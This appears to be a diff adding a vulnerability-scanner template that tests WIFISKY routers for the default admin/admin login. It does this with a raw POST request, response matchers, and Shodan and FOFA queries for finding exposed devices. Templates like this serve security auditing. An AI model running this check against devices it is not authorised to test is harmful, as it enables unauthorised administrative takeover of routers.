@@ -1,0 +1,53 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - part: header
+          type: word
+          words:
+            - text/html
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"success":"true"'
+            - '"data":'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      payloads:
+        password:
+            - admin
+        username:
+            - admin
+      raw:
+        - |
+          POST /login.php?action=login&type=admin HTTP/1.1
+          Host: {{Hostname}}
+          Accept: */*
+          X-Requested-With: XMLHttpRequest
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+          Connection: close
+
+          username={{username}}&password={{password}}
+id: wifisky-default-login
+info:
+    author: pikpikcu
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: Wifisky default admin credentials were discovered.
+    metadata:
+        fofa-query: app="WIFISKY-7层流控路由器"
+        max-request: 1
+        shodan-query: title:"WIFISKY-7层流控路由器"
+        verified: true
+    name: Wifisky Default Login
+    reference:
+        - https://securityforeveryone.com/tools/wifisky-default-password-scanner
+    severity: high
+    tags:
+        - default-login
+        - wifisky
+        - WIFISKY-7层流控路由器
